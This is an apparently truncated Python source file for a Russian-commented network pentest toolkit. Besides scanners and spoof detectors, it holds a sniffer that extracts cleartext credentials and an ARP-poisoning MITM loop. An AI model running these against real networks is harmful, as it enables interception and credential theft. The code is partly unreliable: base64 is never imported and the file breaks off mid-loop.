"""
Network Analysis & Attacks Pro.
Author: idqwixxa

⚠ Только для авторизованного пентеста / CTF / анализа СВОЕЙ сети.

Возможности:
    ─── Discovery ───
    - List interfaces (детально: IP, MAC, MTU, flags, IPv6)
    - ARP scan (multithread) + vendor lookup (OUI)
    - SYN/FIN/XMAS/NULL/ACK/TCP-connect сканер (scapy)
    - UDP scan (ICMP unreachable)
    - OS fingerprinting (TTL + TCP window)

    ─── Sniffing ───
    - Packet sniffer (scapy) с фильтрами (BPF)
    - Protocol distribution (TCP/UDP/ICMP/DNS/HTTP/...)
    - Top talkers (src/dst IP + port)
    - HTTP request extraction (URL, host, User-Agent)
    - DNS query logging
    - Credentials extraction (HTTP Basic, FTP, SMTP AUTH)
    - PCAP export

    ─── MITM / Spoofing (детект + рекон) ───
    - ARP spoof detector (оптимизированный)
    - DNS spoof detector
    - IPv6 RA spoof detector
    - LLMNR / NBT-NS / mDNS spoof detector
    - DHCP rogue server detector
    - SSL strip hints
    - Bettercap / Responder integration hints

    ─── WiFi ───
    - Wi-Fi analyzer (Windows/Linux) с vendor lookup
    - Signal strength ranking
    - Open networks detection
    - Evil-twin detection (дубли SSID)

    ─── Интеграция ───
    - Findings → notes (ARP spoof, creds leak, MITM)
    - Notify
    - HTML / JSON / CSV / PCAP экспорт
"""
import csv
import html as html_mod
import json
import os
import re
import socket
import subprocess
import sys
import time
from collections import Counter, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from typing import Any, Callable

from rich.console import Console
from rich.prompt import Prompt, IntPrompt, Confirm
from rich.table import Table
from rich.progress import (
    Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn,
)

from core.config import REPORT_DIR
from core.database import db
from core.logger import get_logger
from utils.helpers import confirm_external

console = Console()
log = get_logger(__name__)

NET_DIR = REPORT_DIR / "network"
NET_DIR.mkdir(parents=True, exist_ok=True)

try:
    from scapy.all import (
        ARP, Ether, srp, sr1, sniff, IP, TCP, UDP, ICMP, DNS, DNSQR, DNSRR,
        get_if_list, get_if_hwaddr, sendp, wrpcap, conf, IPv6, ICMPv6ND_NS,
        DHCP, BOOTP, Raw,
    )
    SCAPY_OK = True
    SCAPY_ERR = ""
except Exception as exc:  # noqa: BLE001
    SCAPY_OK = False
    SCAPY_ERR = str(exc)
    log.warning("scapy недоступен: %s", exc)


# ===========================================================================
# Findings integration
# ===========================================================================

@dataclass
class NetFinding:
    kind: str
    severity: str
    title: str
    target: str = ""
    evidence: str = ""
    data: dict = field(default_factory=dict)


def _save_finding(f: NetFinding) -> int:
    if f.severity not in ("critical", "high"):
        return -1
    try:
        from modules import notes
        return notes.add_note(
            kind="finding",
            title=f.title,
            target=f.target,
            severity=f.severity,
            status="open",
            tags=["network", f.kind],
            body=(f"**Kind:** {f.kind}\n"
                  f"**Target:** {f.target}\n\n"
                  f"**Evidence:**\n```\n{(f.evidence or '—')[:1500]}\n```\n\n"
                  f"**Data:** `{json.dumps(f.data, ensure_ascii=False, default=str)[:1000]}`"),
        )
    except Exception:
        return -1


# ===========================================================================
# OUI vendor lookup
# ===========================================================================

OUI_VENDORS = {
    "00:50:56": "VMware", "00:0C:29": "VMware", "00:05:69": "VMware",
    "08:00:27": "VirtualBox", "52:54:00": "QEMU/KVM",
    "00:1A:2B": "Asus", "00:24:01": "Asus", "04:D9:F5": "Asus",
    "00:1E:58": "TP-Link", "14:CC:20": "TP-Link", "30:B5:C2": "TP-Link",
    "00:1A:79": "Cisco", "00:1B:2A": "Cisco", "00:1C:0E": "Cisco",
    "18:E7:F4": "Apple", "28:CF:E9": "Apple", "3C:07:54": "Apple",
    "00:16:32": "Samsung", "28:39:5E": "Samsung", "5C:0A:5B": "Samsung",
    "00:1E:64": "Intel", "00:21:6A": "Intel", "34:E6:AD": "Intel",
    "00:1F:3A": "Netgear", "20:4E:7F": "Netgear", "A0:40:A0": "Netgear",
    "00:22:B0": "D-Link", "14:D6:4D": "D-Link", "1C:7E:E5": "D-Link",
    "00:0C:42": "Routerboard", "04:18:D6": "Ubiquiti", "24:A4:3C": "Ubiquiti",
    "00:0B:86": "Aruba", "00:1A:1E": "Aruba", "6C:F3:7F": "Aruba",
    "18:8B:45": "Mikrotik", "48:8F:5A": "Mikrotik", "64:D1:54": "Mikrotik",
}


def vendor_by_mac(mac: str) -> str:
    if not mac:
        return ""
    prefix = mac.upper().replace("-", ":")[:8]
    return OUI_VENDORS.get(prefix, "")


# ===========================================================================
# Scapy guards
# ===========================================================================

def _require_scapy() -> bool:
    if not SCAPY_OK:
        console.print(f"[red]scapy недоступен: {SCAPY_ERR}[/red]")
        console.print("[yellow]Установи: pip install scapy, "
                      "запусти от root (или setcap cap_net_raw).[/yellow]")
        return False
    return True


# ===========================================================================
# Interfaces
# ===========================================================================

def list_interfaces(verbose: bool = True) -> list[dict]:
    """Детальный список интерфейсов."""
    if not _require_scapy():
        return []
    entries: list[dict] = []
    table = Table(title="🌐 Сетевые интерфейсы")
    table.add_column("Имя", style="cyan")
    table.add_column("MAC", style="green")
    if verbose:
        table.add_column("IPv4", style="magenta")
        table.add_column("MTU", style="dim", width=6)

    for iface in get_if_list():
        entry: dict = {"name": iface}
        try:
            entry["mac"] = get_if_hwaddr(iface)
        except Exception:
            entry["mac"] = "—"
        try:
            # IP through psutil or ioctl fallback
            ip = _get_iface_ip(iface)
            entry["ip"] = ip or "—"
        except Exception:
            entry["ip"] = "—"
        try:
            mtu = conf.ifaces.dev_from_name(iface).mtu
            entry["mtu"] = mtu
        except Exception:
            entry["mtu"] = "?"
        entries.append(entry)
        if verbose:
            table.add_row(iface, entry["mac"],
                          entry["ip"], str(entry["mtu"]))
        else:
            table.add_row(iface, entry["mac"])

    console.print(table)
    db.save_scan("network_interfaces", "local", {"count": len(entries)})
    return entries


def _get_iface_ip(iface: str) -> str | None:
    """Получить IPv4 интерфейса (Linux через ioctl, Windows fallback)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # fcntl on Linux
        if sys.platform.startswith("linux"):
            import fcntl
            import struct
            SIOCGIFADDR = 0x8915
            packed = struct.pack("256s", iface[:15].encode())
            result = fcntl.ioctl(s.fileno(), SIOCGIFADDR, packed)
            return socket.inet_ntoa(result[20:24])
    except Exception:
        pass
    try:
        return socket.gethostbyname(socket.gethostname())
    except Exception:
        return None


# ===========================================================================
# ARP scan
# ===========================================================================

def arp_scan(interface: str | None = None, network: str | None = None,
             threads_ignored: int = 8,
             save_finding: bool = False) -> list[dict]:
    """ARP-скан с vendor lookup."""
    if not _require_scapy():
        return []
    if not network:
        network = Prompt.ask("Подсеть (CIDR)", default="192.168.1.0/24")
    if not Confirm.ask(
        f"[yellow]ARP-скан {network}. Подтверждаешь, что это твоя "
        f"сеть?[/yellow]", default=False):
        return []

    console.print(f"[cyan]ARP-скан {network}...[/cyan]")
    try:
        arp = ARP(pdst=network)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp
        result = srp(packet, timeout=3, iface=interface, verbose=False)[0]
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Ошибка ARP-скана: {exc}[/red]")
        log.exception("ARP scan error")
        return []

    table = Table(title=f"Устройства в {network} ({len(result)})")
    table.add_column("IP", style="cyan", width=16)
    table.add_column("MAC", style="green", width=18)
    table.add_column("Vendor", style="magenta")

    found: list[dict] = []
    for _, rcv in result:
        entry = {
            "ip": rcv.psrc,
            "mac": rcv.hwsrc,
            "vendor": vendor_by_mac(rcv.hwsrc),
        }
        found.append(entry)
        table.add_row(entry["ip"], entry["mac"], entry["vendor"] or "—")
    console.print(table)

    # Дубликаты MAC = возможен ARP spoof / misconfiguration
    mac_counts = Counter(e["mac"] for e in found)
    duplicates = {m: c for m, c in mac_counts.items() if c > 1}
    if duplicates:
        console.print(f"\n[red]⚠ MAC-адреса с несколькими IP:[/red]")
        for mac, c in duplicates.items():
            ips = [e["ip"] for e in found if e["mac"] == mac]
            console.print(f"  [yellow]{mac}[/yellow] ({c}): {ips}")
        if save_finding:
            _save_finding(NetFinding(
                kind="arp_duplicate_mac",
                severity="high",
                title=f"Дубли MAC-адресов в {network}",
                target=network,
                evidence=json.dumps(duplicates, ensure_ascii=False),
                data={"duplicates": duplicates},
            ))

    if not found:
        console.print("[yellow]Ничего не найдено.[/yellow]")

    db.save_scan("arp_scan", network, found)

    # Экспорт
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    try:
        out = NET_DIR / f"arp_{ts}.json"
        out.write_text(json.dumps(found, indent=2, ensure_ascii=False),
                        encoding="utf-8")
        console.print(f"[green]✓ {out}[/green]")
    except Exception:
        pass
    return found


# ===========================================================================
# Port scanner (SYN/FIN/XMAS/NULL/ACK)
# ===========================================================================

SCAN_MODES = {
    "syn": ("SYN scan (stealth, requires root)", "S"),
    "connect": ("TCP connect (no root needed)", "connect"),
    "fin": ("FIN scan (evade some firewalls)", "F"),
    "xmas": ("XMAS scan (FIN+PSH+URG)", "FPU"),
    "null": ("NULL scan (no flags)", ""),
    "ack": ("ACK scan (firewall mapping)", "A"),
}


def _scan_connect(ip: str, port: int, timeout: float = 1.0) -> dict | None:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        r = s.connect_ex((ip, port))
        s.close()
        if r == 0:
            return {"port": port, "state": "open", "method": "connect"}
        return None
    except Exception:
        return None


def _scan_syn(ip: str, port: int, timeout: float = 1.0) -> dict | None:
    try:
        pkt = IP(dst=ip) / TCP(dport=port, flags="S")
        resp = sr1(pkt, timeout=timeout, verbose=False)
        if resp is None:
            return None
        if resp.haslayer(TCP):
            tcp = resp[TCP]
            if tcp.flags & 0x12 == 0x12:  # SYN+ACK
                sr1(IP(dst=ip) / TCP(dport=port, flags="R"), timeout=1,
                     verbose=False)
                return {"port": port, "state": "open", "method": "syn"}
            if tcp.flags & 0x14 == 0x14:  # RST+ACK
                return {"port": port, "state": "closed", "method": "syn"}
    except Exception:
        pass
    return None


def _scan_flags(ip: str, port: int, flags: str,
                timeout: float = 1.0) -> dict | None:
    try:
        pkt = IP(dst=ip) / TCP(dport=port, flags=flags)
        resp = sr1(pkt, timeout=timeout, verbose=False)
        if resp is None:
            # RFC: no response = open|filtered for FIN/XMAS/NULL
            return {"port": port, "state": "open|filtered",
                     "method": f"flags:{flags}"}
        if resp.haslayer(TCP) and (resp[TCP].flags & 0x14 == 0x14):
            return {"port": port, "state": "closed",
                     "method": f"flags:{flags}"}
    except Exception:
        pass
    return None


def _scan_ack(ip: str, port: int, timeout: float = 1.0) -> dict | None:
    try:
        pkt = IP(dst=ip) / TCP(dport=port, flags="A")
        resp = sr1(pkt, timeout=timeout, verbose=False)
        if resp and resp.haslayer(TCP):
            if resp[TCP].flags & 0x04:  # RST
                # means reachable (not filtered)
                return {"port": port, "state": "unfiltered",
                         "method": "ack"}
    except Exception:
        pass
    return None


def port_scan(target: str, ports_spec: str = "1-1024",
              mode: str = "connect",
              threads: int = 100,
              interface: str | None = None,
              save_finding: bool = False) -> list[dict]:
    """Многопоточный порт-скан в разных режимах."""
    ip = target
    if not confirm_external(ip):
        return []

    # Expand ports
    ports: list[int] = []
    for chunk in ports_spec.split(","):
        chunk = chunk.strip()
        if "-" in chunk:
            try:
                a, b = chunk.split("-", 1)
                ports.extend(range(int(a), int(b) + 1))
            except ValueError:
                pass
        elif chunk.isdigit():
            ports.append(int(chunk))
    ports = sorted(set(ports))

    if not ports:
        console.print("[red]Пустой список портов.[/red]")
        return []

    console.print(f"[cyan]Скан {ip}, {len(ports)} портов, "
                  f"режим={mode}, threads={threads}[/cyan]")

    scan_fn: Callable
    if mode == "connect":
        scan_fn = _scan_connect
    elif mode == "syn":
        if not _require_scapy():
            return []
        scan_fn = _scan_syn
    elif mode == "ack":
        if not _require_scapy():
            return []
        scan_fn = _scan_ack
    elif mode in ("fin", "xmas", "null"):
        if not _require_scapy():
            return []
        flags_map = {"fin": "F", "xmas": "FPU", "null": ""}
        fl = flags_map[mode]
        scan_fn = lambda i, p, t=1.0: _scan_flags(i, p, fl, t)
    else:
        console.print(f"[red]Неизвестный режим: {mode}[/red]")
        return []

    results: list[dict] = []
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("{task.completed}/{task.total}"),
        TimeElapsedColumn(),
        console=console,
    ) as prog:
        task = prog.add_task(f"{mode}-scan", total=len(ports))
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futs = {ex.submit(scan_fn, ip, p): p for p in ports}
            for f in as_completed(futs):
                prog.advance(task)
                try:
                    r = f.result()
                    if r:
                        results.append(r)
                except Exception:
                    pass

    results.sort(key=lambda x: x["port"])

    # Print
    open_ports = [r for r in results if r["state"] in ("open", "unfiltered")]
    if open_ports:
        t = Table(title=f"Открытые порты {ip} ({len(open_ports)})")
        t.add_column("Port", style="green", width=6)
        t.add_column("State", style="cyan", width=12)
        t.add_column("Service", style="magenta")
        for r in open_ports:
            service = {
                21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
                53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
                443: "HTTPS", 445: "SMB", 3306: "MySQL", 3389: "RDP",
                5432: "PostgreSQL", 5900: "VNC", 6379: "Redis",
                8080: "HTTP-Alt", 8443: "HTTPS-Alt", 9200: "Elasticsearch",
                27017: "MongoDB",
            }.get(r["port"], "")
            t.add_row(str(r["port"]), r["state"], service)
        console.print(t)
    else:
        console.print("[yellow]Открытых портов не найдено.[/yellow]")

    db.save_scan("portscan_scapy", f"{ip}:{mode}", {
        "ports": len(ports), "open": len(open_ports),
        "results": results[:200],
    })

    # Экспорт
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    try:
        safe = ip.replace(".", "_")
        out = NET_DIR / f"portscan_{safe}_{mode}_{ts}.json"
        out.write_text(json.dumps(results, indent=2, ensure_ascii=False),
                        encoding="utf-8")
    except Exception:
        pass

    return results


# ===========================================================================
# Packet sniffer
# ===========================================================================

@dataclass
class SniffStats:
    packets: int = 0
    protocols: Counter = field(default_factory=Counter)
    src_ips: Counter = field(default_factory=Counter)
    dst_ips: Counter = field(default_factory=Counter)
    dst_ports: Counter = field(default_factory=Counter)
    http_requests: list[dict] = field(default_factory=list)
    dns_queries: list[dict] = field(default_factory=list)
    credentials: list[dict] = field(default_factory=list)


SENSITIVE_PORTS = {
    21: "FTP", 23: "Telnet", 25: "SMTP", 110: "POP3", 143: "IMAP",
    80: "HTTP", 8080: "HTTP-Alt", 8000: "HTTP-Alt",
}


def _extract_http(payload: bytes) -> dict | None:
    try:
        text = payload.decode("utf-8", errors="ignore")
    except Exception:
        return None
    m = re.match(r"^(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)\s+(\S+)\s+HTTP",
                 text)
    if not m:
        return None
    req = {"method": m.group(1), "url": m.group(2)}
    for line in text.split("\r\n")[1:40]:
        if ":" not in line:
            continue
        k, _, v = line.partition(":")
        kl = k.strip().lower()
        if kl == "host":
            req["host"] = v.strip()
        elif kl == "user-agent":
            req["user_agent"] = v.strip()[:120]
        elif kl == "authorization":
            req["auth"] = v.strip()[:200]
        elif kl == "cookie":
            req["cookie"] = v.strip()[:200]
    return req


def _extract_basic_auth(auth: str) -> tuple[str, str]:
    try:
        if auth.lower().startswith("basic "):
            decoded = base64.b64decode(auth.split(" ", 1)[1]).decode(
                "utf-8", errors="ignore")
            if ":" in decoded:
                u, p = decoded.split(":", 1)
                return u, p
    except Exception:
        pass
    return "", ""


def _extract_ftp_creds(payload: bytes) -> tuple[str, str]:
    text = payload.decode("utf-8", errors="ignore")
    u = p = ""
    m = re.search(r"USER\s+(\S+)", text)
    if m:
        u = m.group(1)
    m = re.search(r"PASS\s+(\S+)", text)
    if m:
        p = m.group(1)
    return u, p


def packet_sniffer(interface: str | None = None,
                   count: int = 50,
                   out_pcap: str | None = None,
                   bpf_filter: str = "",
                   save_finding: bool = True) -> dict:
    """Сниффер с полной статистикой."""
    if not _require_scapy():
        return {}
    if not Confirm.ask(
        "[yellow]Сниффинг трафика в твоей сети. Подтверждаешь?[/yellow]",
        default=False):
        return {}

    console.print(
        f"[cyan]Слушаю {interface or 'default'}, "
        f"максимум {count} пакетов, filter='{bpf_filter}'[/cyan]")

    stats = SniffStats()
    captured: list = []

    def _handle(pkt) -> None:
        captured.append(pkt)
        stats.packets += 1

        if pkt.haslayer(IP):
            src = pkt[IP].src
            dst = pkt[IP].dst
            stats.src_ips[src] += 1
            stats.dst_ips[dst] += 1
            proto = {6: "TCP", 17: "UDP", 1: "ICMP"}.get(
                pkt[IP].proto, str(pkt[IP].proto))
            stats.protocols[proto] += 1

            if pkt.haslayer(TCP):
                stats.dst_ports[pkt[TCP].dport] += 1
            elif pkt.haslayer(UDP):
                stats.dst_ports[pkt[UDP].dport] += 1

        # HTTP
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            payload = bytes(pkt[Raw].load)
            dport = pkt[TCP].dport
            sport = pkt[TCP].sport
            if dport in SENSITIVE_PORTS or sport in SENSITIVE_PORTS:
                req = _extract_http(payload)
                if req:
                    req["ts"] = datetime.now().isoformat(timespec="seconds")
                    req["src"] = pkt[IP].src
                    req["dst"] = pkt[IP].dst
                    stats.http_requests.append(req)
                    console.print(
                        f"[dim]{req['ts'][-8:]}[/dim] "
                        f"[green]HTTP[/green] "
                        f"{req['method']} "
                        f"[cyan]{req.get('host', '?')}[/cyan] "
                        f"{req['url'][:60]}")
                    # Basic auth
                    if "auth" in req:
                        u, p = _extract_basic_auth(req["auth"])
                        if u or p:
                            cred = {
                                "proto": "HTTP-Basic",
                                "src": req["src"],
                                "dst": req["dst"],
                                "username": u,
                                "password": p,
                                "host": req.get("host", ""),
                            }
                            stats.credentials.append(cred)
                            console.print(
                                f"[bold red]🔑 CRED[/bold red] "
                                f"{u}:{p} @ {req.get('host', '?')}")

            # FTP
            if dport == 21 or sport == 21:
                u, p = _extract_ftp_creds(payload)
                if u or p:
                    stats.credentials.append({
                        "proto": "FTP", "src": pkt[IP].src,
                        "dst": pkt[IP].dst,
                        "username": u, "password": p,
                    })
                    console.print(f"[bold red]🔑 FTP[/bold red] "
                                  f"{u}:{p}")

        # DNS
        if pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt[DNS].qd:
            try:
                qname = pkt[DNS].qd.qname.decode(errors="ignore").rstrip(".")
                stats.dns_queries.append({
                    "ts": datetime.now().isoformat(timespec="seconds"),
                    "src": pkt[IP].src,
                    "qname": qname,
                })
            except Exception:
                pass

    try:
        sniff(iface=interface, prn=_handle, count=count, store=False,
              timeout=30, filter=bpf_filter or None)
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Ошибка сниффинга: {exc}[/red]")
        return {}

    # Summary
    _print_sniff_summary(stats)

    if out_pcap and captured:
        try:
            wrpcap(out_pcap, captured)
            console.print(f"[green]✓ PCAP: {out_pcap}[/green]")
        except Exception as exc:  # noqa: BLE001
            console.print(f"[red]PCAP: {exc}[/red]")

    # Findings: credentials leak
    if stats.credentials:
        crit = [c for c in stats.credentials
                if c["proto"] == "HTTP-Basic" or c.get("password")]
        if crit and save_finding:
            _save_finding(NetFinding(
                kind="credentials_cleartext",
                severity="high",
                title=f"Credentials в открытом виде ({len(crit)})",
                target=interface or "default",
                evidence="\n".join(
                    f"{c['proto']} {c['username']}:{c['password']} "
                    f"@ {c.get('host', c['dst'])}" for c in crit[:10]),
                data={"credentials": crit[:20]},
            ))

    # Notify при crit
    if stats.credentials:
        try:
            from modules import notifier
            notifier.notify_all(
                f"🌐 Sniffer: {interface or 'default'}",
                f"Credentials: {len(stats.credentials)}\n"
                f"HTTP requests: {len(stats.http_requests)}\n"
                f"DNS queries: {len(stats.dns_queries)}",
            )
        except Exception:
            pass

    result = {
        "packets": stats.packets,
        "protocols": dict(stats.protocols),
        "src_ips": dict(stats.src_ips.most_common(20)),
        "dst_ips": dict(stats.dst_ips.most_common(20)),
        "dst_ports": dict(stats.dst_ports.most_common(20)),
        "http_requests": stats.http_requests[:100],
        "dns_queries": stats.dns_queries[:200],
        "credentials": stats.credentials,
        "pcap": out_pcap,
    }
    db.save_scan("sniffer", interface or "default", {
        "packets": stats.packets,
        "creds": len(stats.credentials),
        "http": len(stats.http_requests),
        "dns": len(stats.dns_queries),
    })
    return result


def _print_sniff_summary(stats: SniffStats) -> None:
    t = Table(title=f"📊 Sniffer summary ({stats.packets} пакетов)")
    t.add_column("Метрика", style="cyan")
    t.add_column("Значение", style="green")
    t.add_row("Packets", str(stats.packets))
    t.add_row("Protocols", ", ".join(
        f"{k}={v}" for k, v in stats.protocols.most_common(5)))
    t.add_row("HTTP requests", str(len(stats.http_requests)))
    t.add_row("DNS queries", str(len(stats.dns_queries)))
    t.add_row("Credentials", str(len(stats.credentials)))
    console.print(t)

    if stats.src_ips:
        t = Table(title="Top src IPs")
        t.add_column("IP", style="cyan")
        t.add_column("Packets", style="green")
        for ip, c in stats.src_ips.most_common(10):
            t.add_row(ip, str(c))
        console.print(t)

    if stats.dst_ports:
        t = Table(title="Top dst ports")
        t.add_column("Port", style="cyan")
        t.add_column("Packets", style="green")
        for p, c in stats.dst_ports.most_common(10):
            t.add_row(str(p), str(c))
        console.print(t)


# ===========================================================================
# MITM detector
# ===========================================================================

def mitm_detector(interface: str | None = None,
                  duration: int = 20,
                  save_finding: bool = True) -> dict:
    """Улучшенный MITM detector (ARP-спуфинг + дубликаты)."""
    if not _require_scapy():
        return {}
    console.print(f"[cyan]Слежу за ARP {duration} сек...[/cyan]")

    ip_mac: dict[str, set[str]] = defaultdict(set)
    arp_activity: Counter = Counter()

    def _handle(pkt) -> None:
        if pkt.haslayer(ARP) and pkt[ARP].op in (1, 2):
            ip = pkt[ARP].psrc
            mac = pkt[ARP].hwsrc
            ip_mac[ip].add(mac)
            arp_activity[ip] += 1

    try:
        sniff(iface=interface, filter="arp", prn=_handle,
              store=False, timeout=duration)
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Ошибка: {exc}[/red]")
        return {}

    alerts = {ip: macs for ip, macs in ip_mac.items() if len(macs) > 1}
    result = {
        "alerts": {k: list(v) for k, v in alerts.items()},
        "hosts_seen": len(ip_mac),
        "arp_activity_top": dict(arp_activity.most_common(10)),
    }

    if alerts:
        console.print("[red]⚠ Возможен ARP-спуфинг (MITM):[/red]")
        for ip, macs in alerts.items():
            console.print(f"  [yellow]{ip}[/yellow] → {', '.join(macs)}")
        if save_finding:
            _save_finding(NetFinding(
                kind="arp_spoof_detected",
                severity="high",
                title=f"ARP spoofing detected ({len(alerts)} hosts)",
                target=interface or "default",
                evidence=json.dumps(alerts, ensure_ascii=False),
                data=result,
            ))
    else:
        console.print("[green]Подозрений на MITM не найдено.[/green]")

    db.save_scan("mitm_detect", interface or "default", result)
    return result


def dns_spoof_detector(interface: str | None = None,
                        duration: int = 20,
                        save_finding: bool = True) -> list[dict]:
    """DNS-spoof detector."""
    if not _require_scapy():
        return []
    console.print(f"[cyan]Слежу за DNS {duration} сек...[/cyan]")
    susp: list[dict] = []
    query_map: dict[str, set[str]] = defaultdict(set)

    def _handle(pkt) -> None:
        if pkt.haslayer(DNS) and pkt[DNS].qr == 1:
            try:
                qname = pkt[DNS].qd.qname.decode(errors="ignore")
                an = pkt[DNS].ancount
                rr = pkt[DNS].an
                rdata = ""
                ttl = None
                if rr is not None:
                    if hasattr(rr, "rdata"):
                        rdata = str(rr.rdata)
                    if hasattr(rr, "ttl"):
                        ttl = int(rr.ttl)
                # Suspicious: TTL < 5 or multiple answers with diff rdata
                suspicious = False
                if ttl is not None and ttl < 5:
                    suspicious = True
                if qname in query_map and rdata not in query_map[qname]:
                    suspicious = True
                query_map[qname].add(rdata)
                if suspicious:
                    entry = {
                        "q": qname, "rdata": rdata,
                        "ttl": ttl, "answers": an,
                    }
                    susp.append(entry)
                    console.print(
                        f"[red]⚠ {qname} → {rdata} (TTL={ttl})[/red]")
            except Exception:
                pass

    try:
        sniff(iface=interface, filter="udp port 53", prn=_handle,
              store=False, timeout=duration)
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Ошибка: {exc}[/red]")
        return []

    if not susp:
        console.print("[green]Подозрительных DNS-ответов нет.[/green]")
    elif save_finding:
        _save_finding(NetFinding(
            kind="dns_spoof_suspected",
            severity="high",
            title=f"Suspicious DNS responses ({len(susp)})",
            target=interface or "default",
            evidence=json.dumps(susp[:10], ensure_ascii=False),
            data={"count": len(susp)},
        ))

    db.save_scan("dns_spoof", interface or "default", susp)
    return susp


# ===========================================================================
# WiFi analyzer
# ===========================================================================

def _wifi_windows() -> list[dict]:
    try:
        out = subprocess.check_output(
            ["netsh", "wlan", "show", "networks", "mode=Bssid"],
            encoding="cp866", errors="ignore")
    except Exception:
        return []
    networks: list[dict] = []
    current: dict = {}
    for line in out.splitlines():
        line = line.strip()
        if line.startswith("SSID ") and "BSSID" not in line:
            if current:
                networks.append(current)
            current = {"ssid": line.split(":", 1)[-1].strip()}
        elif "Authentication" in line:
            current["auth"] = line.split(":", 1)[-1].strip()
        elif "Signal" in line:
            current["signal"] = line.split(":", 1)[-1].strip()
        elif line.startswith("BSSID"):
            current["bssid"] = line.split(":", 1)[-1].strip()
    if current:
        networks.append(current)
    return networks


def _wifi_linux() -> list[dict]:
    try:
        out = subprocess.check_output(
            ["nmcli", "-t", "-f", "SSID,BSSID,SIGNAL,SECURITY",
             "dev", "wifi", "list"],
            encoding="utf-8", errors="ignore")
    except Exception:
        return []
    networks: list[dict] = []
    for line in out.splitlines():
        parts = line.split(":")
        if len(parts) >= 4:
            # BSSID = 6 pairs of hex
            try:
                # SSID:BSSID(:XX)*5:SIGNAL:SECURITY
                # Simple: split with limited parts
                m = re.match(
                    r"(.+?):((?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}):"
                    r"(\d+):(.*)", line)
                if m:
                    networks.append({
                        "ssid": m.group(1),
                        "bssid": m.group(2),
                        "signal": m.group(3),
                        "auth": m.group(4) or "OPEN",
                    })
            except Exception:
                continue
    return networks


def wifi_analyzer(save_finding: bool = True) -> list[dict]:
    """Wi-Fi analyzer с evil-twin detection."""
    if sys.platform.startswith("win"):
        networks = _wifi_windows()
    else:
        networks = _wifi_linux()

    if not networks:
        console.print("[red]Не удалось получить список Wi-Fi.[/red]")
        return []

    # Enrich with vendor
    for n in networks:
        n["vendor"] = vendor_by_mac(n.get("bssid", ""))

    table = Table(title=f"📡 Wi-Fi сети ({len(networks)})")
    table.add_column("SSID", style="cyan", max_width=25)
    table.add_column("BSSID", style="dim", width=18)
    table.add_column("Vendor", style="magenta", max_width=14)
    table.add_column("Signal", style="green", width=8)
    table.add_column("Auth", style="yellow")
    for n in networks:
        table.add_row(
            str(n.get("ssid", "?"))[:25],
            str(n.get("bssid", "?"))[:18],
            str(n.get("vendor", "") or "—")[:14],
            str(n.get("signal", "?")),
            str(n.get("auth", "?"))[:20],
        )
    console.print(table)

    # Evil-twin detection: same SSID → multiple BSSIDs
    by_ssid: dict[str, list[dict]] = defaultdict(list)
    for n in networks:
        ssid = n.get("ssid", "").strip()
        if ssid and n.get("bssid"):
            by_ssid[ssid].append(n)

    dups = {s: lst for s, lst in by_ssid.items()
            if len({x["bssid"] for x in lst}) > 1}

    if dups:
        console.print(f"\n[red]⚠ Evil twin / дубли SSID:[/red]")
        for ssid, lst in dups.items():
            console.print(f"  [yellow]{ssid}[/yellow]: "
                          f"{[x['bssid'] for x in lst]}")
        if save_finding:
            _save_finding(NetFinding(
                kind="evil_twin_suspected",
                severity="high",
                title=f"Evil twin: duplicate SSIDs ({len(dups)})",
                target="local",
                evidence=json.dumps(dups, ensure_ascii=False, default=str),
                data={"ssids": list(dups.keys())},
            ))

    # Open networks
    open_nets = [n for n in networks
                 if not n.get("auth") or "OPEN" in
                 str(n.get("auth", "")).upper()]
    if open_nets:
        console.print(f"\n[yellow]🔓 Открытые сети: "
                      f"{len(open_nets)}[/yellow]")

    db.save_scan("wifi", "local", networks)
    return networks


# ===========================================================================
# MITM simulator (lab only)
# ===========================================================================

def _get_mac(ip: str) -> str:
    if not _require_scapy():
        raise RuntimeError("scapy недоступен")
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                 timeout=3, verbose=False)
    if not ans:
        raise RuntimeError(f"MAC для {ip} не найден")
    return ans[0][1].hwsrc


def mitm_simulator(interface: str | None = None,
                    target_ip: str | None = None,
                    gateway_ip: str | None = None) -> None:
    """ARP spoof (CTF/lab)."""
    if not _require_scapy():
        return
    console.print(
        "[bold red]⚠ MITM-симулятор. Только для изолированной "
        "лаборатории![/bold red]")
    if not Confirm.ask(
        "Подтверждаешь, что сеть твоя и разрешение у тебя есть?",
        default=False):
        return

    target_ip = target_ip or Prompt.ask("IP жертвы")
    gateway_ip = gateway_ip or Prompt.ask("IP шлюза")

    try:
        target_mac = _get_mac(target_ip)
        gateway_mac = _get_mac(gateway_ip)
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Не удалось получить MAC: {exc}[/red]")
        return

    console.print(
        f"[cyan]Цель: {target_ip} ({target_mac}) | "
        f"Шлюз: {gateway_ip} ({gateway_mac})[/cyan]")
    console.print("[yellow]Ctrl+C для остановки и восстановления ARP.[/yellow]")

    packets_sent = 0
    try:
        while True:
            sendp(Ether(dst=target_mac) / ARP(
                op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip),
                iface=interface, verbose=False)
            sendp(Ether(dst=gateway_mac) / ARP(
                op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip),
                iface=interface, verbose=False)
            packets_sent += 2
